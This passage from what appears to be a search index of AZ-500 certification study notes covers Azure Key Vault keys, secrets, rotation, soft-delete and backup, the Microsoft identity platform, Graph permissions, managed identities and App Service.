Key Vault and stored, and isn't released to the client. Asymmetric keys may be created in Key Vault.</li> <li>Import: Allows a client to import an existing key to Key Vault. Asymmetric keys may be imported to Key Vault using many different packaging methods within a JWK construct.</li> <li>Update: Allows a client with sufficient permissions to modify the metadata (key attributes) associated with a key previously stored within Key Vault.</li> <li>Delete: Allows a client with sufficient permissions to delete a key from Key Vault</li> </ul> <p>Cryptographic operations. - Once a key has been created in Key Vault, the following cryptographic operations may be performed using the key. For best application performance, verify that operations are performed locally.</p> <ul> <li>Sign and Verify: Strictly, this operation is \"sign hash\" or \"verify hash\", as Key Vault doesn't support hashing of content as part of signature creation. Applications should hash the data to be signed locally, then request that Key Vault signs the hash. Verification of signed hashes is supported as a convenience operation for applications that may not have access to [public] key material.</li> <li>Key Encryption / Wrapping: A key stored in Key Vault may be used to protect another key, typically a symmetric\u00a0content encryption key (CEK). When the key in Key Vault is asymmetric, key encryption is used. When the key in Key Vault is symmetric, key wrapping is used.</li> <li>Encrypt and Decrypt: A key stored in Key Vault may be used to encrypt or decrypt a single block of data. The size of the block is determined using the key type and selected encryption algorithm. The Encrypt operation is provided for convenience, for applications that may not have access to [public] key material.</li> </ul> <p>Apps hosted in App Service and Azure Functions can now define a reference to a secret managed in Key Vault as part of their application settings.</p> <p>Configure a hardware security module key-generation solution. - </p> <p>For added assurance, when you use Azure Key Vault, you can import or generate keys in hardware security modules (HSMs) that never leave the HSM boundary. This scenario is often referred to as Bring Your Own Key (BYOK). The HSMs are FIPS 140-2 Level 2 validated. Azure Key Vault uses Thales nShield family of HSMs to protect your keys. (This functionality isn't available for Azure China.) Generating and transferring an HSM-protected key over the Internet:</p> <ul> <li>You generate the key from an offline workstation, which reduces the attack surface.</li> <li>The key is encrypted with a\u00a0Key Exchange Key (KEK), which stays encrypted until transferred to the Azure Key Vault HSMs. Only the encrypted version of your key leaves the original workstation.</li> <li>The toolset sets properties on your tenant key that binds your key to the Azure Key Vault security world. After the Azure Key Vault HSMs receive and decrypt your key, only these HSMs can use it. Your key can't be exported. This binding is enforced using the Thales HSMs.</li> <li>The KEK that encrypts your key is generated inside the Azure Key Vault HSMs, and isn't exportable. The HSMs enforce that there can be no clear version of the KEK outside the HSMs. In addition, the toolset includes attestation from Thales that the KEK isn't exportable and was generated inside a genuine HSM manufactured by Thales.</li> <li>The toolset includes attestation from Thales that the Azure Key Vault security world was also generated on a genuine HSM manufactured by Thales.</li> <li>Microsoft uses separate KEKs and separate security worlds in each geographical region. This separation ensures that your key can be used only in data centers in the region in which you encrypted it. For example, a key from a European customer can't be used in data centers in North American or Asia.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#14-manage-customer-managed-keys","title":"1.4. Manage customer managed keys","text":"<p>Once, you have created your Key Vault and have populated it with keys and secrets. The next step is to set up a rotation strategy for the values you store as Key Vault secrets. Secrets can be rotated in several ways:</p> <ul> <li>As part of a manual process</li> <li>Programmatically by using REST API calls</li> <li>Through an Azure Automation script</li> </ul> <p>Example of storage service encryption with customer-managed Keys. - This service uses Azure Key Vault that provides highly available and scalable secure storage for RSA cryptographic keys backed by FIPS 140-2 Level 2 validated HSMs (Hardware Security Modules). Key Vault streamlines the key management process and enables customers to maintain control of keys that are used to encrypt data, manage, and audit their key usage, in order to protect sensitive data as part of their regulatory or compliance needs, HIPAA and BAA compliant.</p> <p></p> <p>Customers can generate/import their RSA key to Azure Key Vault and enable Storage Service Encryption. Azure Storage handles the encryption and decryption in a fully transparent fashion using envelope encryption in which data is encrypted using an AES-based key, which in turn is protected using the Customer-Managed Key stored in Azure Key Vault.</p> <p>Customers can rotate their key in Azure Key Vault as per their compliance policies. When they rotate their key, Azure Storage detects the new key version and re-encrypts the Account Encryption Key for that storage account. Key rotation doesn't result in re-encryption of all data and there's no other action required from user.</p> <p>Customers can also revoke access to the storage account by revoking access on their key in Azure Key Vault. There are several ways to revoke access to your keys. Revoking access effectively blocks access to all blobs in the storage account as the Account Encryption Key is inaccessible by Azure Storage.</p> <p>Customers can enable this feature on all available redundancy types of Azure Blob storage including premium storage and can toggle from using Microsoft managed to using customer-managed keys. There's no extra charge for enabling this feature.</p> <p>You can enable this feature on any Azure Resource Manager storage account using the Azure portal, Azure PowerShell, Azure CLI, or the Microsoft Azure Storage Resource Provider API.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#15-key-vault-secrets","title":"1.5. Key vault secrets","text":"<p>Key Vault provides secure storage of secrets, such as passwords and database connection strings. From a developer's perspective, Key Vault APIs accept and return secret values as strings. Internally, Key Vault stores and manages secrets as sequences of octets (8-bit bytes), with a maximum size of 25k bytes each. The Key Vault service doesn't provide semantics for secrets. It merely accepts the data, encrypts it, stores it, and returns a secret identifier (\"ID\"). The identifier can be used to retrieve the secret at a later time.</p> <p>Key Vault also supports a contentType field for secrets. Clients may specify the content type of a secret to assist in interpreting the secret data when it's retrieved. The maximum length of this field is 255 characters. There are no pre-defined values. The suggested usage is as a hint for interpreting the secret data. For instance, an implementation may store both passwords and certificates as secrets, then use this field to differentiate.</p> <p></p> <p>As shown above, the values for Key Vault Secrets are:</p> <ul> <li>Name-value pair -\u00a0Name must be unique in the Vault</li> <li>Value can be any\u00a0Unicode Transformation Format (UTF-8)\u00a0string - max of 25 KB in size</li> <li>Manual or certificate creation</li> <li>Activation date</li> <li>Expiration date</li> </ul> <p>Encryption. - All secrets in your Key Vault are stored encrypted. Key Vault encrypts secrets at rest with a hierarchy of encryption keys, with all keys in that hierarchy are protected by modules that are Federal Information Processing Standards (FIPS) 140-2 compliant. This encryption is transparent, and requires no action from the user. The Azure Key Vault service encrypts your secrets when you add them, and decrypts them automatically when you read them. The encryption leaf key of the key hierarchy is unique to each key vault. The encryption root key of the key hierarchy is unique to the security world, and its protection level varies between regions:</p> <ul> <li>China: root key is protected by a module that is validated for FIPS 140-2 Level 1.</li> <li>Other regions: root key is protected by a module that is validated for FIPS 140-2 Level 2 or higher.</li> </ul> <p>Secret attributes. - In addition to the secret data, the following attributes may be specified:</p> <ul> <li>exp: IntDate, optional,\u00a0default is forever. The\u00a0exp\u00a0(expiration time)\u00a0attribute identifies the expiration time on or after which the secret data\u00a0SHOULD NOT\u00a0be retrieved, except in particular situations. This field is for informational purposes only as it informs users of key vault service that a particular secret may not be used. Its value MUST be a number containing an IntDate value.</li> <li>nbf: IntDate, optional,\u00a0default is now. The\u00a0nbf\u00a0(not before)\u00a0attribute identifies the time before which the secret data\u00a0SHOULD NOT\u00a0be retrieved, except in particular situations. This field is for informational purposes only. Its value\u00a0MUST\u00a0be a number containing an IntDate value.</li> <li>enabled: boolean, optional,\u00a0default is true. This attribute specifies whether the secret data can be retrieved. The enabled attribute is used with\u00a0nbf\u00a0and\u00a0exp\u00a0when an operation occurs between\u00a0nbf\u00a0and\u00a0exp, it will only be permitted if enabled is set to true. Operations outside the\u00a0nbf\u00a0and\u00a0exp\u00a0window are automatically disallowed, except in particular situations.</li> </ul> <p>There are more read-only attributes that are included in any response that includes secret attributes:</p> <ul> <li>created: IntDate, optional. The created attribute indicates when this version of the secret was created. This value is null for secrets created prior to the addition of this attribute. Its value must be a number containing an IntDate value.</li> <li>updated: IntDate, optional. The updated attribute indicates when this version of the secret was updated. This value is null for secrets that were last updated prior to the addition of this attribute. Its value must be a number containing an IntDate value.</li> </ul> <p>Secret access control. -  Access Control for secrets managed in Key Vault, is provided at the level of the Key Vault that contains those secrets. The following permissions can be used, on a per-principal basis, in the secrets access control entry on a vault, and closely mirror the operations allowed on a secret object:</p> <ul> <li> <p>Permissions for secret management operations</p> <ul> <li>get: Read a secret</li> <li>list: List the secrets or versions of a secret stored in a Key Vault</li> <li>set: Create a secret</li> <li>delete: Delete a secret</li> <li>recover: Recover a deleted secret</li> <li>backup: Back up a secret in a key vault</li> <li>restore: Restore a backed up secret to a key vault</li> <li> <p>Permissions for privileged operations</p> </li> <li> <p>purge: Purge (permanently delete) a deleted secret</p> </li> </ul> </li> </ul> <p>You can specify more application-specific metadata in the form of tags. Key Vault supports up to 15 tags, each of which can have a 256 character name and a 256 character value.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#configure-key-rotation","title":"Configure key rotation","text":"<p>Once you have keys and secrets stored in the key vault it's important to think about a rotation strategy. There are several ways to rotate the values:</p> <ul> <li>As part of a manual process</li> <li>Programmatically by using API calls</li> <li>Through an Azure Automation script</li> </ul> <p>This diagram shows how Event Grid and Function Apps can be used to automate the process.</p> <p></p> <ol> <li>Thirty days before the expiration date of a secret, Key Vault publishes the \"near expiry\" event to Event Grid.</li> <li>Event Grid checks the event subscriptions and uses HTTP POST to call the function app endpoint subscribed to the event.</li> <li>The function app receives the secret information, generates a new random password, and creates a new version for the secret with the new password in Key Vault.</li> <li>The function app updates SQL Server with the new password.</li> </ol>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#16-manage-key-vault-safety-and-recovery-features","title":"1.6. Manage Key Vault safety and recovery features","text":"<p>Key Vault's soft-delete feature allows recovery of the deleted vaults and deleted key vault objects (for example, keys, secrets, certificates), known as soft-delete. This safeguard offer the following protections:</p> <ul> <li>Once a secret, key, certificate, or key vault is deleted, it remains recoverable for a configurable period of 7 to 90 calendar days. If no configuration is specified, the default recovery period is set to 90 days. Users are provided with sufficient time to notice an accidental secret deletion and respond.</li> <li>When creating a new key vault, soft-delete is on by default. Once soft-delete is enabled on a key vault, it can't be disabled.  Once set, the retention policy interval can't be changed.</li> <li>The soft-delete feature is available through the REST API, the Azure CLI, PowerShell, .NET/C# interfaces, and ARM templates.</li> <li>The purge protection retention policy uses the same interval (7-90 days).  Once set, the retention policy interval can't be changed.</li> <li>You can't reuse the name of a key vault that has been soft-deleted until the retention period has passed.</li> <li> <p>Permanently deleting, purging, a key vault is possible via a POST operation on the proxy resource and requires special privileges. Generally, only the subscription owner is able to purge a key vault. The POST operation triggers the immediate and irrecoverable deletion of that vault. Exceptions are:</p> <ul> <li>When the Azure subscription has been marked as\u00a0undeletable. In this case, only the service may then perform the actual deletion, and does so as a scheduled process.</li> <li>When the--enable-purge-protection argument is enabled on the vault itself. In this case, Key Vault waits for 90 days from when the original secret object was marked for deletion to permanently delete the object.</li> </ul> </li> <li> <p>To purge a secret in the soft-deleted state, a service principal must be granted another \"purge\" access policy permission. The purge access policy permission isn't granted by default to any service principal including key vault and subscription owners and must be deliberately set. By requiring an elevated access policy permission to purge a soft-deleted secret, it reduces the probability of accidentally deleting a secret.</p> </li> </ul> <p>Key vault recovery. - Upon deleting a key vault object, the service will place the object in a deleted state, making it inaccessible to any retrieval operations. During the soft-delete retention interval, the following apply:</p> <ul> <li>You may list all of the key vaults and key vault objects in the soft-delete state for your subscription as well as access deletion and recovery information about them. Only users with special permissions can list deleted vaults. We recommend that our users create a custom role with these special permissions for handling deleted vaults.</li> <li>A key vault with the same name can't be created in the same location; correspondingly, a key vault object can't be created in a given vault if that key vault contains an object with the same name and which is in a deleted state.</li> <li>Only a privileged user may restore a key vault or key vault object by issuing a recover command on the corresponding proxy resource. The user, member of the custom role, who has the privilege to create a key vault under the resource group can restore the vault.</li> <li>Only a privileged user may forcibly delete a key vault or key vault object by issuing a delete command on the corresponding proxy resource.</li> </ul> <p>Unless a key vault or key vault object is recovered, at the end of the retention interval the service performs a purge of the soft-deleted key vault or key vault object and its content. Resource deletion may not be rescheduled.</p> <p>Billing. - In general, when an object (a key vault or a key or a secret) is in deleted state, there are only two operations possible: 'purge' and 'recover'. All the other operations fail. Therefore, even though the object exists, no operations can be performed and hence no usage will occur, so no bill. However there are following exceptions:</p> <ul> <li>'purge' and 'recover' actions count towards normal key vault operations and billed.</li> <li>If the object is an HSM-key, the 'HSM Protected key' charge per key version per month charge applies if a key version has been used in last 30 days. After that, since the object is in deleted state no operations can be performed against it, so no charge will apply.</li> </ul> <p>Soft-deleted protection by default from February 2025. -  If a secret is deleted and the key vault doesn't have soft-deleted protection, it's deleted permanently. Although users can currently opt out of soft-delete during key vault creation, this ability is deprecated. In February 2025, Microsoft enables soft-delete protection on all key vaults, and users are no longer be able to opt out of or turn off soft-delete. This, protect secrets from accidental or malicious deletion by a user.</p> <p></p> <p>Key vault backup. - Back up secrets only if you have a critical business justification. Backing up secrets in your key vault may introduce operational challenges such as maintaining multiple sets of logs, permissions, and backups when secrets expire or rotate. Key Vault maintains availability in disaster scenarios and will automatically fail over requests to a paired region without any intervention from a user. If you want protection against accidental or malicious deletion of your secrets, configure soft-delete and purge protection features on your key vault.</p> <p>Key Vault does not support the ability to backup more than 500 past versions of a key, secret, or certificate object. Attempting to backup a key, secret, or certificate object may result in an error. It is not possible to delete previous versions of a key, secret, or certificate.</p> <p>Key Vault doesn't currently provide a way to back up an entire key vault in a single operation. Any attempt to use the commands listed in this document to do an automated backup of a key vault may result in errors and not supported by Microsoft or the Azure Key Vault team.</p> <p>When you back up a key vault object, such as a secret, key, or certificate, the backup operation downloads the object as an encrypted blob. This blob can't be decrypted outside of Azure.\u00a0To get usable data from this blob, you must restore the blob into a key vault within the same Azure subscription and Azure geography. To back up a key vault object, you must have:</p> <ul> <li>Contributor-level or higher permissions on an Azure subscription.</li> <li>A primary key vault that contains the secrets you want to back up.</li> <li>A secondary key vault where secrets are restored.</li> </ul> <p>Azure Dedicated HSM is most suitable for \u201clift-and-shift\u201d scenarios that require direct and sole access to HSM devices. Examples include:</p> <ul> <li>Migrating applications from on-premises to Azure Virtual Machines</li> <li>Migrating applications from Amazon AWS EC2 to virtual machines that use the AWS Cloud HSM Classic service</li> <li>Running shrink-wrapped software such as Apache/Ngnix SSL Offload, Oracle TDE, and ADCS in Azure Virtual Machines</li> </ul> <p>Azure Dedicated HSM is not a good fit for the following type of scenario: Microsoft cloud services that support encryption with customer-managed keys (such as Azure Information Protection, Azure Disk Encryption, Azure Data Lake Store, Azure Storage, Azure SQL Database, and Customer Key for Office 365) that are not integrated with Azure Dedicated HSM.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#2-application-security-features","title":"2. Application Security features","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#21-microsoft-identity-platform","title":"2.1. Microsoft Identity Platform","text":"<p>Some acronyms:</p> <ul> <li>Azure AD Authentication Library (ADAL)</li> <li>Microsoft Authentication Library (MSAL)</li> <li>Microsoft Secure Development Lifecycle (SDL)</li> </ul> <p>Microsoft identity platform is an evolution of the Azure Active Directory (Azure AD) developer platform. The Microsoft identity platform supports industry-standard protocols such as OAuth 2.0 and OpenID Connect. With this unified Microsoft identity platform (v2.0), you can write code once and authenticate any Microsoft identity into your application.</p> <p>The fully supported open-source Microsoft Authentication Library (MSAL) is recommended for use against the identity platform endpoints. MSAL...  - is simple to use  - provides great single sign-on (SSO) experiences for your users  - helps you achieve high reliability and performance,   - and is developed using Microsoft Secure Development Lifecycle (SDL).</p> <p>With the Microsoft identity platform, one can expand their reach to these kinds of users:</p> <ul> <li>Work and school accounts (Microsoft Entra ID provisioned accounts)</li> <li>Personal accounts (such as Outlook.com or Hotmail.com)</li> <li>Your customers who bring their own email or social identity (such as LinkedIn, Facebook, and Google) via MSAL and Azure AD Business-to-Consumer (B2C)</li> </ul> <p>The Microsoft identity platform has two endpoints (v1.0 and v2.0); however, when developing a new application, consider it's highly recommended that you use the v2.0 (default) endpoint to benefit from the latest features and capabilities:</p> <p>The Microsoft Authentication Library or MSAL can be used in many application scenarios, including the following:</p> <ul> <li>Single-page applications (JavaScript)</li> <li>Web app signing in users</li> <li>Web application signing in a user and calling a web API on behalf of the user</li> <li>Protecting a web API so only authenticated users can access it</li> <li>Web API calling another downstream Web API on behalf of the signed-in user</li> <li>Desktop application calling a web API on behalf of the signed-in user</li> <li>Mobile application calling a web API on behalf of the user who's signed in interactively.</li> <li>Desktop/service daemon application calling web API on behalf of itself</li> </ul> <p>Languages and frameworks</p> Library Supported platforms and frameworks MSAL for Android Android MSAL Angular Single-page apps with Angular and Angular.js frameworks MSAL for iOS and macOS iOS and macOS MSAL Go (Preview) Windows, macOS, Linux MSAL Java Windows, macOS, Linux MSAL.js JavaScript/TypeScript frameworks such as Vue.js, Ember.js, or Durandal.js MSAL.NET .NET Framework, .NET Core, Xamarin Android, Xamarin iOS, Universal Windows Platform MSAL Node Web apps with Express, desktop apps with Electron, Cross-platform console apps MSAL Python Windows, macOS, Linux MSAL React Single-page apps with React and React-based libraries (Next.js, Gatsby.js) <p>Migrate apps that use ADAL to MSAL. - Active Directory Authentication Library (ADAL) integrates with the Azure AD for developers (v1.0) endpoint, where MSAL integrates with the Microsoft identity platform. The v1.0 endpoint supports work accounts but not personal accounts. The v2.0 endpoint is unifying Microsoft personal accounts and works accounts into a single authentication system. Additionally, with MSAL, you can also get authentications for Azure AD B2C.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#the-application-model","title":"The Application Model","text":"<p>For an identity provider to know that a user has access to a particular app, both the user and the application must be registered with the identity provider. When you register your application with\u00a0Microsoft Entra ID, you're providing an identity configuration for your application that allows it to integrate with the Microsoft identity platform. Registering the app also allows you to:</p> <ul> <li>Customize the branding of your application in the sign-in dialog box.</li> <li>Decide if you want to allow users to sign in only if they belong to your organization. This architecture is known as a single-tenant application. Or, you can allow users to sign in by using any work or school account, which is known as a multi-tenant application. </li> <li>Request scope permissions. For example, you can request the \"user.read\" scope, which grants permission to read the profile of the signed-in user.</li> <li>Define scopes that define access to your web\u00a0application programming interface (API). </li> <li>Share a secret with the Microsoft identity platform that proves the app's identity.</li> </ul> <p>After the app is registered, it's given a unique identifier that it shares with the Microsoft identity platform when it requests tokens. If the app is a confidential client application, it will also share the secret or the public key depending on whether certificates or secrets were used. The Microsoft identity platform represents applications by using a model that fulfills two main functions:</p> <ul> <li>Identify the app by the authentication protocols it supports.</li> <li>Provide all the identifiers,\u00a0Uniform Resource Locators (URLs), secrets, and related information that are needed to authenticate.</li> </ul> <p>The Microsoft identity platform:</p> <ul> <li>Holds all the data required to support authentication at runtime.</li> <li>Holds all the data for deciding what resources an app might need to access, and under what circumstances a given request should be fulfilled.</li> <li>Provides infrastructure for implementing app provisioning within the app developer's tenant, and to any other Microsoft Entra tenant.</li> <li>Handles user consent during token request time and facilitates the dynamic provisioning of apps across tenants.</li> </ul> <p>Flow in multi-tenant apps</p> <p></p> <p>In this provisioning flow:</p> <ol> <li>A user from tenant B attempts to sign in with the app. The authorization endpoint requests a token for the application.</li> <li>The user credentials are acquired and verified for authentication.</li> <li>The user is prompted to provide consent for the app to gain access to tenant B.</li> <li>The Microsoft identity platform uses the application object in tenant A as a blueprint for creating a service principal in tenant B.</li> <li>The user receives the requested token.</li> </ol> <p>You can repeat this process for more tenants. Tenant A retains the blueprint for the\u00a0app (application object). Users and admins of all the other tenants where the app is given consent keep control over what the application is allowed to do via the corresponding service principal object in each tenant.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#22-register-an-application-with-app-registration","title":"2.2.  Register an application with App Registration","text":"<p>Before your app can get a token from the Microsoft identity platform, it must be registered in the Azure portal. Registration integrates your app with the Microsoft identity platform and establishes the information that it uses to get tokens, including:</p> <ul> <li>Application ID: A unique identifier assigned by the Microsoft identity platform.</li> <li>Redirect URI/URL: One or more endpoints at which your app will receive responses from the Microsoft identity platform. (For native and mobile apps, this is a URI assigned by the Microsoft identity platform.)</li> <li>Application Secret: A password or a public/private key pair that your app uses to authenticate with the Microsoft identity platform. (Not needed for native or mobile apps.)</li> </ul> <p>Like most developers, you will probably use authentication libraries to manage your token interactions with the Microsoft identity platform. Authentication libraries abstract many protocol details, like validation, cookie handling, token caching, and maintaining secure connections, away from the developer and let you focus your development on your app. Microsoft publishes open-source client libraries and server middleware.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#23-configure-microsoft-graph-permissions","title":"2.3. Configure Microsoft Graph permissions","text":"<p>Microsoft Graph exposes granular permissions that control the access that apps have to resources, like users, groups, and mail.</p> <p>Microsoft Graph has two types of permissions:</p> <ul> <li>Delegated permissions\u00a0are used by apps that have a signed-in user present. For these apps, either the user or an administrator consents to the permissions that the app requests, and the app can act as the signed-in user when making calls to Microsoft Graph. Some delegated permissions can be consented by non-administrative users, but some higher-privileged permissions require administrator consent.</li> <li>Application permissions\u00a0are used by apps that run without a signed-in user present; for example, apps that run as background services or daemons. Application permissions can only be consented by an administrator.</li> </ul> <p>Effective permissions are the permissions that your app will have when making requests to Microsoft Graph. It is important to understand the difference between the delegated and application permissions that your app is granted and its effective permissions when making calls to Microsoft Graph.</p> <p>For example, assume your app has been granted the User.ReadWrite.All delegated permission. This permission nominally grants your app permission to read and update the profile of every user in an organization. If the signed-in user is a global administrator, your app will be able to update the profile of every user in the organization. However, if the signed-in user is not in an administrator role, your app will be able to update only the profile of the signed-in user</p> <p>Microsoft Graph API. - \u00a0The Microsoft Graph Security API is an intermediary service (or broker) that provides a single programmatic interface to connect multiple Microsoft Graph Security providers (also called security providers or providers). The Microsoft Graph Security API federates requests to all providers in the Microsoft Graph Security ecosystem.</p> <p></p> <p>The following is a description of the flow:</p> <ol> <li>The application user signs in to the provider application to view the consent form from the provider. This consent form experience or UI is owned by the provider and applies to non-Microsoft providers only to get explicit consent from their customers to send requests to Microsoft Graph Security API.</li> <li>The client consent is stored on the provider side.</li> <li>The provider consent service calls the Microsoft Graph Security API to inform consent approval for the respective customer.</li> <li>The application sends a request to the Microsoft Graph Security API.</li> <li>The Microsoft Graph Security API checks for the consent information for this customer mapped to various providers.</li> <li>The Microsoft Graph Security API calls all those providers the customer has given explicit consent to via the provider consent experience.</li> <li>The response is returned from all the consented providers for that client.</li> <li>The result set response is returned to the application.</li> <li>If the customer has not consented to any provider, no results from those providers are included in the response.</li> </ol> <p>Why use the Microsoft Graph Security API?</p> <ul> <li>Write code \u2013 Find code samples in C#, Java, NodeJS, and more.</li> <li>Connect using scripts \u2013 Find PowerShell samples.</li> <li>Drag and drop into workflows and playbooks \u2013 Use Microsoft Graph Security connectors for Azure Logic Apps, Microsoft Flow, and PowerApps.</li> <li>Get data into reports and dashboards \u2013 Use the Microsoft Graph Security connector for Power BI.</li> <li>Connect using Jupyter notebooks \u2013 Find Jupyter notebook samples.</li> <li>Unify and standardize alert tracking:  Connect once to integrate alerts from any Microsoft Graph-integrated security solution and keep alert status and assignments in sync across all solutions. You can also stream alerts to security information and event management (SIEM) solutions, such as Splunk using Microsoft Graph Security API connectors.</li> <li>Correlate security alerts to improve threat protection and response: Correlate alerts across security solutions more easily with a unified alert schema.</li> <li>Update alert tags, status, and assignments: Tag alerts with additional context or threat intelligence to inform response and remediation. Ensure that comments and feedback on alerts are captured for visibility to all workflows. Keep alert status and assignments in sync so that all integrated solutions reflect the current state. Use webhook subscriptions to get notified of changes.</li> <li>Unlock security context to drive investigation: Dive deep into related security-relevant inventory (like users, hosts, and apps), then add organizational context from other Microsoft Graph providers (Microsoft Entra ID, Microsoft Intune, Microsoft 365) to bring business and security contexts together and improve threat response.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#24-enable-managed-identities","title":"2.4. Enable managed identities","text":"<p>Managed Identities\u00a0for Azure resources is the new name for the service formerly known as Managed Service Identity (MSI) for Azure resources feature in Microsoft Entra provides Azure services with an automatically managed identity in Microsoft Entra ID. You can use the identity to authenticate to any service that supports Microsoft Entra authentication, including Key Vault, without any credentials in your code. The managed identities for Azure resources feature is free with Microsoft Entra ID for Azure subscriptions. There's no additional cost.</p> <p>Terminology. - The following terms are used throughout the managed identities for Azure resources documentation set:</p> <ul> <li>Client ID\u00a0- a unique identifier generated by Microsoft Entra ID that is tied to an application and service principal during its initial provisioning.</li> <li>Principal ID\u00a0- the object ID of the service principal object for your managed identity that is used to grant role-based access to an Azure resource.</li> <li>Azure Instance Metadata Service (IMDS)\u00a0- a REST endpoint accessible to all IaaS VMs created via the Azure Resource Manager. The endpoint is available at a well-known non-routable IP address (169.254.169.254) that can be accessed only from within the VM.</li> </ul> <p>How managed identities for Azure resources works. - There are two types of managed identities:</p> <ul> <li>A system-assigned managed identity\u00a0is enabled directly on an Azure service instance. When the identity is enabled, Azure creates an identity for the instance in the Microsoft Entra tenant that's trusted by the subscription of the instance. After the identity is created, the credentials are provisioned onto the instance. The lifecycle of a system-assigned identity is directly tied to the Azure service instance that it's enabled on. If the instance is deleted, Azure automatically cleans up the credentials and the identity in Microsoft Entra ID.</li> <li>A user-assigned managed identity\u00a0is created as a standalone Azure resource. Through a create process, Azure creates an identity in the Microsoft Entra tenant that's trusted by the subscription in use. After the identity is created, the identity can be assigned to one or more Azure service instances. The lifecycle of a user-assigned identity is managed separately from the lifecycle of the Azure service instances to which it's assigned.</li> </ul> <p>The following table shows the differences between the two types of managed identities:</p> Property System-assigned managed identity User-assigned managed identity Creation Created as part of an Azure resource (for example, Azure Virtual Machines or Azure App Service). Created as a stand-alone Azure resource. Life cycle Shared life cycle with the Azure resource that the managed identity is created with.   When the parent resource is deleted, the managed identity is deleted as well. Independent life cycle.  Must be explicitly deleted. Sharing across Azure resources Can\u2019t be shared.  It can only be associated with a single Azure resource. Can be shared.  The same user-assigned managed identity can be associated with more than one Azure resource. Common use cases Workloads contained within a single Azure resource.  Workloads needing independent identities.  For example, an application that runs on a single virtual machine. Workloads that run on multiple resources and can share a single identity.  Workloads needing pre-authorization to a secure resource, as part of a provisioning flow.  Workloads where resources are recycled frequently, but permissions should stay consistent.  For example, a workload where multiple virtual machines need to access the same resource. <p>Credential rotation. - Credential rotation is controlled by the resource provider that hosts the Azure resource. The default rotation of the credential occurs every 46 days. It's up to the resource provider to call for new credentials, so the resource provider could wait longer than 46 days. The following diagram shows how managed service identities work with Azure virtual machines (VMs):</p> <p></p> <ol> <li>Azure Resource Manager receives a request to enable the system-assigned managed identity on a VM.</li> <li>Azure Resource Manager creates a service principal in Microsoft Entra ID for the identity of the VM. The service principal is created in the Microsoft Entra tenant that's trusted by the subscription.</li> <li>Azure Resource Manager configures the identity on the VM by updating the Azure Instance Metadata Service identity endpoint with the service principal client ID and certificate.</li> <li>After the VM has an identity, use the service principal information to grant the VM access to Azure resources. To call Azure Resource Manager, use role-based access control (RBAC) in Microsoft Entra ID to assign the appropriate role to the VM service principal. To call Key Vault, grant your code access to the specific secret or key in Key Vault.</li> <li>Your code that's running on the VM can request a token from the Azure Instance Metadata service endpoint, accessible only from within the VM:\u00a0http://169.254.169.254/metadata/identity/oauth2/token<ul> <li>The resource parameter specifies the service to which the token is sent. To authenticate to Azure Resource Manager, use resource=https://management.azure.com/.</li> <li>API version parameter specifies the IMDS version, use api-version=2018-02-01 or greater.</li> </ul> </li> <li>A call is made to Microsoft Entra ID to request an access token (as specified in step 5) by using the client ID and certificate configured in step 3. Microsoft Entra ID returns a JSON Web Token (JWT) access token.</li> <li>Your code sends the access token on a call to a service that supports Microsoft Entra authentication</li> </ol>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#25-azure-app-services","title":"2.5. Azure App Services","text":"<p>Azure App Service\u00a0is an HTTP-based service for\u00a0hosting web applications,\u00a0REST APIs, and\u00a0mobile backends. You can develop in your favorite language, be it .NET, .NET Core, Java, Ruby, Node.js, PHP, or Python. Applications run and scale with ease on both Windows and Linux-based environments. Azure App Service is a fully managed platform as a service (PaaS) offering for developers. Here are some key features of App Service:</p> <ul> <li>Multiple languages and frameworks - App Service has first-class support for ASP.NET, ASP.NET Core, Java, Ruby, Node.js, PHP, or Python. You can also run PowerShell and other scripts or executables as background services.</li> <li>Managed production environment - App Service automatically patches and maintains the OS and language frameworks for you. </li> <li>Containerization and Docker - Dockerize your app and host a custom Windows or Linux container in App Service. Run multi-container apps with Docker Compose. </li> <li>DevOps optimization - Set up continuous integration and deployment with Azure DevOps, GitHub, BitBucket, Docker Hub, or Azure Container Registry. </li> <li>Global scale with high availability - Scale up or out manually or automatically.</li> <li>Connections to SaaS platforms and on-premises data - Choose from more than 50 connectors for enterprise systems (such as SAP), SaaS services (such as Salesforce), and internet services (such as Facebook). Access on-premises data using Hybrid Connections and Azure Virtual Networks.</li> <li>Security and compliance - The App Service is ISO, SOC, and PCI compliant. Authenticate users with Microsoft Entra ID, Google, Facebook, Twitter, or Microsoft account. Create IP address restrictions and manage service identities. Prevent subdomain takeovers.</li> <li>Application templates - Choose from an extensive list of application templates in the Azure Marketplace, such as WordPress, Joomla, and Drupal.</li> <li>Visual Studio and Visual Studio Code integration - Dedicated tools in Visual Studio and Visual Studio Code streamline the work of creating, deploying, and debugging.</li> <li>API and mobile features - App Service provides turn-key CORS support for RESTful API scenarios and simplifies mobile app scenarios by enabling authentication, offline data sync, push notifications, and more.</li> <li>Serverless code - Run a code snippet or script on-demand without having to explicitly provision or manage infrastructure and pay only for the compute time your code actually uses.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#26-app-service-environment","title":"2.6. App Service Environment","text":"<p>An\u00a0App Service Environment\u00a0is an Azure App Service feature that provides a fully isolated and dedicated environment for running App Service apps securely at high scale. An App Service Environment can host:</p> <ul> <li>Windows web apps</li> <li>Linux web apps</li> <li>Docker containers (Windows\u00a0and\u00a0Linux)</li> <li>Functions</li> <li>Logic apps (Standard)</li> </ul> <p>App Service Environments have many use cases, including:</p> <ul> <li>Internal line-of-business applications.</li> <li>Applications that need more than 30 